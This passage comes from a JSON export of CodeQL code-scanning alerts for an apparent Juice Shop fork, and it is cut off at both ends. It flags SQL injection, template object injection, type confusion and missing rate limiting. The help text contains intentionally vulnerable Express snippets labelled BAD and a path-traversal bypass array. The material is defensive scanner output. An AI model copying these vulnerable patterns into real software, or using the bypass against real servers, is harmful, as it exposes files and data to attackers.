[Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs a file system access, but is not rate-limited."},"location":{"path":"server.ts","start_line":262,"end_line":262,"start_column":36,"end_column":54},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/19/instances","dismissal_approved_by":null},{"number":18,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/18","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/18","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/missing-rate-limiting","severity":"warning","description":"Missing rate limiting","name":"js/missing-rate-limiting","tags":["external/cwe/cwe-307","external/cwe/cwe-400","external/cwe/cwe-770","security"],"full_description":"An HTTP request handler that performs expensive operations without restricting the rate at which operations can be carried out is vulnerable to denial-of-service attacks.","help":"# Missing rate limiting\nHTTP request handlers should not perform expensive operations such as accessing the file system, executing an operating system command or interacting with a database without limiting the rate at which requests are accepted. Otherwise, the application becomes vulnerable to denial-of-service attacks where an attacker can cause the application to crash or become unresponsive by issuing a large number of requests at the same time.\n\n\n## Recommendation\nA rate-limiting middleware should be used to prevent such attacks.\n\n\n## Example\nThe following example shows an Express application that serves static files without rate limiting:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\nTo prevent denial-of-service attacks, the `express-rate-limit` package can be used:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\n// set up rate limiter: maximum of five requests per minute\nvar RateLimit = require('express-rate-limit');\nvar limiter = RateLimit({\n  windowMs: 15 * 60 * 1000, // 15 minutes\n  max: 100, // max 100 requests per windowMs\n});\n\n// apply rate limiter to all requests\napp.use(limiter);\n\napp.get('/:path', function(req, res) {\n  let path = req.params.path;\n  if (isValidPath(path))\n    res.sendFile(path);\n});\n\n```\n\n## References\n* OWASP: [Denial of Service Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html).\n* Wikipedia: [Denial-of-service attack](https://en.wikipedia.org/wiki/Denial-of-service_attack).\n* NPM: [express-rate-limit](https://www.npmjs.com/package/express-rate-limit).\n* Common Weakness Enumeration: [CWE-770](https://cwe.mitre.org/data/definitions/770.html).\n* Common Weakness Enumeration: [CWE-307](https://cwe.mitre.org/data/definitions/307.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This route handler performs authorization, but is not rate-limited."},"location":{"path":"server.ts","start_line":261,"end_line":261,"start_column":40,"end_column":52},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/18/instances","dismissal_approved_by":null},{"number":17,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/17","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/17","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/template-object-injection","severity":"error","description":"Template Object Injection","name":"js/template-object-injection","tags":["external/cwe/cwe-073","external/cwe/cwe-094","security"],"full_description":"Instantiating a template using a user-controlled object is vulnerable to local file read and potential remote code execution.","help":"# Template Object Injection\nDirectly using user-controlled objects as arguments to template engines might allow an attacker to do local file reads or even remote code execution.\n\n\n## Recommendation\nAvoid using user-controlled objects as arguments to a template engine. Instead, construct the object explicitly with the specific properties needed by the template.\n\n\n## Example\nIn the example below a server uses the user-controlled `profile` object to render the `index` template.\n\n\n```javascript\nvar app = require('express')();\napp.set('view engine', 'hbs');\n\napp.post('/', function (req, res, next) {\n    var profile = req.body.profile;\n    res.render('index', profile);\n});\n```\nHowever, if an attacker adds a `layout` property to the `profile` object then the server will load the file specified by the `layout` property, thereby allowing an attacker to do local file reads.\n\nThe fix is to have the server construct the object, and only add the properties that are needed by the template.\n\n\n```javascript\nvar app = require('express')();\napp.set('view engine', 'hbs');\n\napp.post('/', function (req, res, next) {\n    var profile = req.body.profile;\n    res.render('index', {\n        name: profile.name,\n        location: profile.location\n    });\n});\n```\n\n## References\n* blog.shoebpatel.com: [The Secret Parameter, LFR, and Potential RCE in NodeJS Apps](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/).\n* cwe.mitre.org: [CWE-73: External Control of File Name or Path](https://cwe.mitre.org/data/definitions/73.html)\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n","security_severity_level":"critical"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Template object depends on a user-provided value.\nTemplate object depends on a user-provided value."},"location":{"path":"routes/dataErasure.ts","start_line":87,"end_line":89,"start_column":39,"end_column":8},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/17/instances","dismissal_approved_by":null},{"number":16,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/16","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/16","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/template-object-injection","severity":"error","description":"Template Object Injection","name":"js/template-object-injection","tags":["external/cwe/cwe-073","external/cwe/cwe-094","security"],"full_description":"Instantiating a template using a user-controlled object is vulnerable to local file read and potential remote code execution.","help":"# Template Object Injection\nDirectly using user-controlled objects as arguments to template engines might allow an attacker to do local file reads or even remote code execution.\n\n\n## Recommendation\nAvoid using user-controlled objects as arguments to a template engine. Instead, construct the object explicitly with the specific properties needed by the template.\n\n\n## Example\nIn the example below a server uses the user-controlled `profile` object to render the `index` template.\n\n\n```javascript\nvar app = require('express')();\napp.set('view engine', 'hbs');\n\napp.post('/', function (req, res, next) {\n    var profile = req.body.profile;\n    res.render('index', profile);\n});\n```\nHowever, if an attacker adds a `layout` property to the `profile` object then the server will load the file specified by the `layout` property, thereby allowing an attacker to do local file reads.\n\nThe fix is to have the server construct the object, and only add the properties that are needed by the template.\n\n\n```javascript\nvar app = require('express')();\napp.set('view engine', 'hbs');\n\napp.post('/', function (req, res, next) {\n    var profile = req.body.profile;\n    res.render('index', {\n        name: profile.name,\n        location: profile.location\n    });\n});\n```\n\n## References\n* blog.shoebpatel.com: [The Secret Parameter, LFR, and Potential RCE in NodeJS Apps](https://blog.shoebpatel.com/2021/01/23/The-Secret-Parameter-LFR-and-Potential-RCE-in-NodeJS-Apps/).\n* cwe.mitre.org: [CWE-73: External Control of File Name or Path](https://cwe.mitre.org/data/definitions/73.html)\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n","security_severity_level":"critical"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Template object depends on a user-provided value.\nTemplate object depends on a user-provided value."},"location":{"path":"routes/dataErasure.ts","start_line":72,"end_line":74,"start_column":41,"end_column":10},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/16/instances","dismissal_approved_by":null},{"number":15,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/15","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/15","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/type-confusion-through-parameter-tampering","severity":"error","description":"Type confusion through parameter tampering","name":"js/type-confusion-through-parameter-tampering","tags":["external/cwe/cwe-843","security"],"full_description":"Sanitizing an HTTP request parameter may be ineffective if the user controls its type.","help":"# Type confusion through parameter tampering\nSanitizing untrusted HTTP request parameters is a common technique for preventing injection attacks such as SQL injection or path traversal. This is sometimes done by checking if the request parameters contain blacklisted substrings.\n\nHowever, sanitizing request parameters assuming they have type `String` and using the builtin string methods such as `String.prototype.indexOf` is susceptible to type confusion attacks. In a type confusion attack, an attacker tampers with an HTTP request parameter such that it has a value of type `Array` instead of the expected type `String`. Furthermore, the content of the array has been crafted to bypass sanitizers by exploiting that some identically named methods of strings and arrays behave differently.\n\n\n## Recommendation\nCheck the runtime type of sanitizer inputs if the input type is user-controlled.\n\nAn even safer alternative is to design the application so that sanitization is not needed, for instance by using prepared statements for SQL queries.\n\n\n## Example\nFor example, Node.js server frameworks usually present request parameters as strings. But if an attacker sends multiple request parameters with the same name, then the request parameter is represented as an array instead.\n\nIn the following example, a sanitizer checks that a path does not contain the `\"..\"` string, which would allow an attacker to access content outside a user-accessible directory.\n\n\n```javascript\nvar app = require(\"express\")(),\n  path = require(\"path\");\n\napp.get(\"/user-files\", function(req, res) {\n  var file = req.param(\"file\");\n  if (file.indexOf(\"..\") !== -1) {\n    // BAD\n    // we forbid relative paths that contain ..\n    // as these could leave the public directory\n    res.status(400).send(\"Bad request\");\n  } else {\n    var absolute = path.resolve(\"/public/\" + file);\n    console.log(\"Sending file: %s\", absolute);\n    res.sendFile(absolute);\n  }\n});\n\n```\nAs written, this sanitizer is ineffective: an array like `[\"../\", \"/../secret.txt\"]` will bypass the sanitizer. The array does not contain `\"..\"` as an element, so the call to `indexOf` returns `-1` . This is problematic since the value of the `absolute` variable then ends up being `\"/secret.txt\"`. This happens since the concatenation of `\"/public/\"` and the array results in `\"/public/../,/../secret.txt\"`, which the `resolve`-call converts to `\"/secret.txt\"`.\n\nTo fix the sanitizer, check that the request parameter is a string, and not an array:\n\n\n```javascript\nvar app = require(\"express\")(),\n  path = require(\"path\");\n\napp.get(\"/user-files\", function(req, res) {\n  var file = req.param(\"file\");\n  if (typeof file !== 'string' || file.indexOf(\"..\") !== -1) {\n    // GOOD\n    // we forbid relative paths that contain ..\n    // as these could leave the public directory\n    res.status(400).send(\"Bad request\");\n  } else {\n    var absolute = path.resolve(\"/public/\" + file);\n    console.log(\"Sending file: %s\", absolute);\n    res.sendFile(absolute);\n  }\n});\n\n```\n\n## References\n* Node.js API: [querystring](https://nodejs.org/api/querystring.html).\n* Common Weakness Enumeration: [CWE-843](https://cwe.mitre.org/data/definitions/843.html).\n","security_severity_level":"critical"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Potential type confusion as this HTTP request parameter may be either an array or a string."},"location":{"path":"routes/search.ts","start_line":22,"end_line":22,"start_column":17,"end_column":25},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/15/instances","dismissal_approved_by":null},{"number":14,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/14","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/14","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/type-confusion-through-parameter-tampering","severity":"error","description":"Type confusion through parameter tampering","name":"js/type-confusion-through-parameter-tampering","tags":["external/cwe/cwe-843","security"],"full_description":"Sanitizing an HTTP request parameter may be ineffective if the user controls its type.","help":"# Type confusion through parameter tampering\nSanitizing untrusted HTTP request parameters is a common technique for preventing injection attacks such as SQL injection or path traversal. This is sometimes done by checking if the request parameters contain blacklisted substrings.\n\nHowever, sanitizing request parameters assuming they have type `String` and using the builtin string methods such as `String.prototype.indexOf` is susceptible to type confusion attacks. In a type confusion attack, an attacker tampers with an HTTP request parameter such that it has a value of type `Array` instead of the expected type `String`. Furthermore, the content of the array has been crafted to bypass sanitizers by exploiting that some identically named methods of strings and arrays behave differently.\n\n\n## Recommendation\nCheck the runtime type of sanitizer inputs if the input type is user-controlled.\n\nAn even safer alternative is to design the application so that sanitization is not needed, for instance by using prepared statements for SQL queries.\n\n\n## Example\nFor example, Node.js server frameworks usually present request parameters as strings. But if an attacker sends multiple request parameters with the same name, then the request parameter is represented as an array instead.\n\nIn the following example, a sanitizer checks that a path does not contain the `\"..\"` string, which would allow an attacker to access content outside a user-accessible directory.\n\n\n```javascript\nvar app = require(\"express\")(),\n  path = require(\"path\");\n\napp.get(\"/user-files\", function(req, res) {\n  var file = req.param(\"file\");\n  if (file.indexOf(\"..\") !== -1) {\n    // BAD\n    // we forbid relative paths that contain ..\n    // as these could leave the public directory\n    res.status(400).send(\"Bad request\");\n  } else {\n    var absolute = path.resolve(\"/public/\" + file);\n    console.log(\"Sending file: %s\", absolute);\n    res.sendFile(absolute);\n  }\n});\n\n```\nAs written, this sanitizer is ineffective: an array like `[\"../\", \"/../secret.txt\"]` will bypass the sanitizer. The array does not contain `\"..\"` as an element, so the call to `indexOf` returns `-1` . This is problematic since the value of the `absolute` variable then ends up being `\"/secret.txt\"`. This happens since the concatenation of `\"/public/\"` and the array results in `\"/public/../,/../secret.txt\"`, which the `resolve`-call converts to `\"/secret.txt\"`.\n\nTo fix the sanitizer, check that the request parameter is a string, and not an array:\n\n\n```javascript\nvar app = require(\"express\")(),\n  path = require(\"path\");\n\napp.get(\"/user-files\", function(req, res) {\n  var file = req.param(\"file\");\n  if (typeof file !== 'string' || file.indexOf(\"..\") !== -1) {\n    // GOOD\n    // we forbid relative paths that contain ..\n    // as these could leave the public directory\n    res.status(400).send(\"Bad request\");\n  } else {\n    var absolute = path.resolve(\"/public/\" + file);\n    console.log(\"Sending file: %s\", absolute);\n    res.sendFile(absolute);\n  }\n});\n\n```\n\n## References\n* Node.js API: [querystring](https://nodejs.org/api/querystring.html).\n* Common Weakness Enumeration: [CWE-843](https://cwe.mitre.org/data/definitions/843.html).\n","security_severity_level":"critical"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"Potential type confusion as this HTTP request parameter may be either an array or a string."},"location":{"path":"lib/insecurity.ts","start_line":138,"end_line":138,"start_column":26,"end_column":29},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/14/instances","dismissal_approved_by":null},{"number":13,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/13","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/13","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/sql-injection","severity":"error","description":"Database query built from user-controlled sources","name":"js/sql-injection","tags":["external/cwe/cwe-089","external/cwe/cwe-090","external/cwe/cwe-943","security"],"full_description":"Building a database query from user-controlled sources is vulnerable to insertion of malicious code by the user.","help":"# Database query built from user-controlled sources\nIf a database query (such as a SQL or NoSQL query) is built from user-provided data without sufficient sanitization, a malicious user may be able to run malicious database queries.\n\n\n## Recommendation\nMost database connector libraries offer a way of safely embedding untrusted data into a query by means of query parameters or prepared statements.\n\nFor NoSQL queries, make use of an operator like MongoDB's `$eq` to ensure that untrusted data is interpreted as a literal value and not as a query object. Alternatively, check that the untrusted data is a literal value and not a query object before using it in a query.\n\nFor SQL queries, use query parameters or prepared statements to embed untrusted data into the query string, or use a library like `sqlstring` to escape untrusted data.\n\n\n## Example\nIn the following example, assume the function `handler` is an HTTP request handler in a web application, whose parameter `req` contains the request object.\n\nThe handler constructs an SQL query string from user input and executes it as a database query using the `pg` library. The user input may contain quote characters, so this code is vulnerable to a SQL injection attack.\n\n\n```javascript\nconst app = require(\"express\")(),\n      pg = require(\"pg\"),\n      pool = new pg.Pool(config);\n\napp.get(\"search\", function handler(req, res) {\n  // BAD: the category might have SQL special characters in it\n  var query1 =\n    \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='\" +\n    req.params.category +\n    \"' ORDER BY PRICE\";\n  pool.query(query1, [], function(err, results) {\n    // process results\n  });\n});\n\n```\nTo fix this vulnerability, we can use query parameters to embed the user input into the query string. In this example, we use the API offered by the `pg` Postgres database connector library, but other libraries offer similar features. This version is immune to injection attacks.\n\n\n```javascript\nconst app = require(\"express\")(),\n      pg = require(\"pg\"),\n      pool = new pg.Pool(config);\n\napp.get(\"search\", function handler(req, res) {\n  // GOOD: use parameters\n  var query2 =\n    \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=$1 ORDER BY PRICE\";\n  pool.query(query2, [req.params.category], function(err, results) {\n    // process results\n  });\n});\n\n```\nAlternatively, we can use a library like `sqlstring` to escape the user input before embedding it into the query string:\n\n\n```javascript\nconst app = require(\"express\")(),\n      pg = require(\"pg\"),\n      SqlString = require('sqlstring'),\n      pool = new pg.Pool(config);\n\napp.get(\"search\", function handler(req, res) {\n  // GOOD: the category is escaped using mysql.escape\n  var query1 =\n    \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='\" +\n    SqlString.escape(req.params.category) +\n    \"' ORDER BY PRICE\";\n  pool.query(query1, [], function(err, results) {\n    // process results\n  });\n});\n\n```\n\n## Example\nIn the following example, an express handler attempts to delete a single document from a MongoDB collection. The document to be deleted is identified by its `_id` field, which is constructed from user input. The user input may contain a query object, so this code is vulnerable to a NoSQL injection attack.\n\n\n```javascript\nconst express = require(\"express\");\nconst mongoose = require(\"mongoose\");\nconst Todo = mongoose.model(\n  \"Todo\",\n  new mongoose.Schema({ text: { type: String } }, { timestamps: true })\n);\n\nconst app = express();\napp.use(express.json());\napp.use(express.urlencoded({ extended: false }));\n\napp.delete(\"/api/delete\", async (req, res) => {\n  let id = req.body.id;\n\n  await Todo.deleteOne({ _id: id }); // BAD: id might be an object with special properties\n\n  res.json({ status: \"ok\" });\n});\n\n```\nTo fix this vulnerability, we can use the `$eq` operator to ensure that the user input is interpreted as a literal value and not as a query object:\n\n\n```javascript\napp.delete(\"/api/delete\", async (req, res) => {\n  let id = req.body.id;\n  await Todo.deleteOne({ _id: { $eq: id } }); // GOOD: using $eq operator for the comparison\n\n  res.json({ status: \"ok\" });\n});\n```\nAlternatively check that the user input is a literal value and not a query object before using it:\n\n\n```javascript\napp.delete(\"/api/delete\", async (req, res) => {\n  let id = req.body.id;\n  if (typeof id !== \"string\") {\n    res.status(400).json({ status: \"error\" });\n    return;\n  }\n  await Todo.deleteOne({ _id: id }); // GOOD: id is guaranteed to be a string\n\n  res.json({ status: \"ok\" });\n});\n\n```\n\n## References\n* Wikipedia: [SQL injection](https://en.wikipedia.org/wiki/SQL_injection).\n* MongoDB: [$eq operator](https://docs.mongodb.com/manual/reference/operator/query/eq).\n* OWASP: [NoSQL injection](https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf).\n* Common Weakness Enumeration: [CWE-89](https://cwe.mitre.org/data/definitions/89.html).\n* Common Weakness Enumeration: [CWE-90](https://cwe.mitre.org/data/definitions/90.html).\n* Common Weakness Enumeration: [CWE-943](https://cwe.mitre.org/data/definitions/943.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This query object depends on a user-provided value.\nThis query object depends on a user-provided value."},"location":{"path":"routes/updateProductReviews.ts","start_line":18,"end_line":18,"start_column":7,"end_column":27},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/13/instances","dismissal_approved_by":null},{"number":12,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/12","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/12","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/sql-injection","severity":"error","description":"Database query built from user-controlled sources","name":"js/sql-injection","tags":["external/cwe/cwe-089","external/cwe/cwe-090","external/cwe/cwe-943","security"],"full_description":"Building a database query from user-controlled sources is vulnerable to insertion of malicious code by the user.","help":"# Database query built from user-controlled sources\nIf a database query (such as a SQL or NoSQL query) is built from user-provided data without sufficient sanitization, a malicious user may be able to run malicious database queries.\n\n\n## Recommendation\nMost database connector libraries offer a way of safely embedding untrusted data into a query by means of query parameters or prepared statements.\n\nFor NoSQL queries, make use of an operator like MongoDB's `$eq` to ensure that untrusted data is interpreted as a literal value and not as a query object. Alternatively, check that the untrusted data is a literal value and not a query object before using it in a query.\n\nFor SQL queries, use query parameters or prepared statements to embed untrusted data into the query string, or use a library like `sqlstring` to escape untrusted data.\n\n\n## Example\nIn the following example, assume the function `handler` is an HTTP request handler in a web application, whose parameter `req` contains the request object.\n\nThe handler constructs an SQL query string from user input and executes it as a database query using the `pg` library. The user input may contain quote characters, so this code is vulnerable to a SQL injection attack.\n\n\n```javascript\nconst app = require(\"express\")(),\n      pg = require(\"pg\"),\n      pool = new pg.Pool(config);\n\napp.get(\"search\", function handler(req, res) {\n  // BAD: the category might have SQL special characters in it\n  var query1 =\n    \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='\" +\n    req.params.category +\n    \"' ORDER BY PRICE\";\n  pool.query(query1, [], function(err, results) {\n    // process results\n  });\n});\n\n```\nTo fix this vulnerability, we can use query parameters to embed the user input into the query string. In this example, we use the API offered by the `pg` Postgres database connector library, but other libraries offer similar features. This version is immune to injection attacks.\n\n\n```javascript\nconst app = require(\"express\")(),\n      pg = require(\"pg\"),\n      pool = new pg.Pool(config);\n\napp.get(\"search\", function handler(req, res) {\n  // GOOD: use parameters\n  var query2 =\n    \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=$1 ORDER BY PRICE\";\n  pool.query(query2, [req.params.category], function(err, results) {\n    // process results\n  });\n});\n\n```\nAlternatively, we can use a library like `sqlstring` to escape the user input before embedding it into the query string:\n\n\n```javascript\nconst app = require(\"express\")(),\n      pg = require(\"pg\"),\n      SqlString = require('sqlstring'),\n      pool = new pg.Pool(config);\n\napp.get(\"search\", function handler(req, res) {\n  // GOOD: the category is escaped using mysql.escape\n  var query1 =\n    \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='\" +\n    SqlString.escape(req.params.category) +\n    \"' ORDER BY PRICE\";\n  pool.query(query1, [], function(err, results) {\n    // process results\n  });\n});\n\n```\n\n## Example\nIn the following example, an express handler attempts to delete a single document from a MongoDB collection. The document to be deleted is identified by its `_id` field, which is constructed from user input. The user input may contain a query object, so this code is vulnerable to a NoSQL injection attack.\n\n\n```javascript\nconst express = require(\"express\");\nconst mongoose = require(\"mongoose\");\nconst Todo = mongoose.model(\n  \"Todo\",\n  new mongoose.Schema({ text: { type: String } }, { timestamps: true })\n);\n\nconst app = express();\napp.use(express.json());\napp.use(express.urlencoded({ extended: false }));\n\napp.delete(\"/api/delete\", async (req, res) => {\n  let id = req.body.id;\n\n  await Todo.deleteOne({ _id: id }); // BAD: id might be an object with special properties\n\n  res.json({ status: \"ok\" });\n});\n\n```\nTo fix this vulnerability, we can use the `$eq` operator to ensure that the user input is interpreted as a literal value and not as a query object:\n\n\n```javascript\napp.delete(\"/api/delete\", async (req, res) => {\n  let id = req.body.id;\n  await Todo.deleteOne({ _id: { $eq: id } }); // GOOD: using $eq operator for the comparison\n\n  res.json({ status: \"ok\" });\n});\n```\nAlternatively check that the user input is a literal value and not a query object before using it:\n\n\n```javascript\napp.delete(\"/api/delete\", async (req, res) => {\n  let id = req.body.id;\n  if (typeof id !== \"string\") {\n    res.status(400).json({ status: \"error\" });\n    return;\n  }\n  await Todo.deleteOne({ _id: id }); // GOOD: id is guaranteed to be a string\n\n  res.json({ status: \"ok\" });\n});\n\n```\n\n## References\n* Wikipedia: [SQL injection](https://en.wikipedia.org/wiki/SQL_injection).\n* MongoDB: [$eq operator](https://docs.mongodb.com/manual/reference/operator/query/eq).\n* OWASP: [NoSQL injection](https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf).\n* Common Weakness Enumeration: [CWE-89](https://cwe.mitre.org/data/definitions/89.html).\n* Common Weakness Enumeration: [CWE-90](https://cwe.mitre.org/data/definitions/90.html).\n* Common Weakness Enumeration: [CWE-943](https://cwe.mitre.org/data/definitions/943.html).\n","security_severity_level":"high"},"tool":{"name":"CodeQL","guid":null,"version":"2.20.4"},"most_recent_instance":{"ref":"refs/heads/master","analysis_key":".github/workflows/codeql.yml:analyze","environment":"{\"build-mode\":\"none\",\"language\":\"javascript-typescript\"}","category":"/language:javascript-typescript","state":"open","commit_sha":"b0373854f5e0ac84629c229925093b6aade39318","message":{"text":"This query string depends on a user-provided value."},"location":{"path":"routes/search.ts","start_line":23,"end_line":23,"start_column":28,"end_column":160},"classifications":[]},"instances_url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/12/instances","dismissal_approved_by":null},{"number":11,"created_at":"2025-01-27T04:17:20Z","updated_at":"2025-01-27T04:23:22Z","url":"https://api.github.com/repos/anubhav2025/juice-shop/code-scanning/alerts/11","html_url":"https://github.com/anubhav2025/juice-shop/security/code-scanning/11","state":"open","fixed_at":null,"dismissed_by":null,"dismissed_at":null,"dismissed_reason":null,"dismissed_comment":null,"rule":{"id":"js/sql-injection","severity":"error","description":"Database query built from user-controlled sources","name":"js/sql-injection","tags":["external/cwe/cwe-089","external/cwe/cwe-090","external/cwe/cwe-943","security"],"full_description":"Building a database query from user-controlled sources is vulnerable to insertion of malicious code by the user.","help":"# Database query built from user-controlled sources\nIf a database query (such as a SQL or NoSQL query) is built from user-provided data without sufficient sanitization, a malicious user may be able to run malicious database queries.\n\n\n## Recommendation\nMost database connector libraries offer a way of safely embedding untrusted data into a query by means of query parameters or prepared statements.\n\nFor NoSQL queries, make use of an operator like MongoDB's `$eq` to ensure that untrusted data is interpreted as a literal value and not as a query object. Alternatively, check that the untrusted data is a literal value and not a query object before using it in a query.\n\nFor SQL queries, use query parameters or prepared statements to embed untrusted data into the query string, or use a library like `sqlstring` to escape untrusted data.\n\n\n## Example\nIn the following example, assume the function `handler` is an HTTP request handler in a web application, whose parameter `req` contains the request object.\n\nThe handler constructs an SQL query string from user input and executes it as a database query using the `pg` library. The user input may contain quote characters, so this code is vulnerable to a SQL injection attack.\n\n\n```javascript\nconst app = require(\"express\")(),\n      pg = require(\"pg\"),\n      pool = new pg.Pool(config);\n\napp.get(\"search\", function handler(req, res) {\n  // BAD: the category might have SQL special characters in it\n  var query1 =\n    \"SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='\" +\n    req.params.category +\n    \"' ORDER BY PRICE\";\n  pool.query(query1, [], function(err, results) {\n    // process results\n  });\n});\n\n```\nTo fix this vulnerability, we can use query parameters to embed the user input into the query string. In this example, we use the API offered by the `pg` Postgres database connector library, but other libraries offer similar features. This version is immune to injection attacks.\n\n\n```javascript\nconst app = require(\"express\")(),\n      pg = require(\"pg\"),\n      pool = new pg.Pool(config);\n\napp.get(\"search\", function handler(req, res) {\n  // GOOD: use parameters\n  var query2 =\n    \"SELECT ITEM,PRICE FROM PRODUCT WHERE 